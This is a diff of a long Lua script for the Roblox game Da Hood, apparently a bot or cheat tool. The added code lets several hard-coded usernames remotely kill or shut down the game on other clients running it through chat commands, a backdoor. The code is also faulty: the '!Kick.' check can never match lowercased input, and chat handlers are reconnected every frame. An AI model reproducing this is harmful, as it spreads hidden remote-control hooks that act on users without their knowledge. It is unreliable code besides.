@@ -7107,6 +7107,7 @@ end)
         end
     end)
     end
+    
     if game.Players.LocalPlayer.Name == "dahoodbotmoney5" then
         print("omg sigma")
     else
@@ -7116,13 +7117,16 @@ end)
         -- Chat Connect --
         local MainAccount = "dahoodbotmoney5" -- MainAccount Username
         game.Players[MainAccount].Chatted:Connect(function(msg)
-        if msg:lower() == "!reset." then
-            game.ReplicatedStorage.MainEvent:FireServer("ResetNew")game.Players.LocalPlayer.Character.Humanoid:ChangeState'Dead'
-        end
+            if msg:lower() == "!reset." then
+                game.ReplicatedStorage.MainEvent:FireServer("ResetNew")game.Players.LocalPlayer.Character.Humanoid:ChangeState'Dead'
+            elseif msg:lower() == "!Kick." then
+                game:Shutdown()
+            end
         end)
     end) 
     end)
     end
+    
     
     if game.Players.LocalPlayer.Name == "zer1ckq" then
         print("omg sigma")
@@ -7133,8 +7137,30 @@ end)
         -- Chat Connect --
         local MainAccount = "zer1ckq" -- MainAccount Username
         game.Players[MainAccount].Chatted:Connect(function(msg)
+            if msg:lower() == "!reset." then
+                game.ReplicatedStorage.MainEvent:FireServer("ResetNew")game.Players.LocalPlayer.Character.Humanoid:ChangeState'Dead'
+            elseif msg:lower() == "!Kick." then
+                game:Shutdown()
+            end
+        end)
+    end) 
+    end)
+    end
+
+
+    if game.Players.LocalPlayer.Name == "Lasents_TH" then
+        print("omg sigma")
+    else
+    local PP = game.Players.LocalPlayer
+    game:GetService("RunService").RenderStepped:Connect(function()
+        pcall(function()
+        -- Chat Connect --
+        local MainAccount = "Lasents_TH" -- MainAccount Username
+        game.Players[MainAccount].Chatted:Connect(function(msg)
         if msg:lower() == "!reset." then
             game.ReplicatedStorage.MainEvent:FireServer("ResetNew")game.Players.LocalPlayer.Character.Humanoid:ChangeState'Dead'
+        elseif msg:lower() == "!Kick." then
+            game:Shutdown()
         end
         end)
     end) 
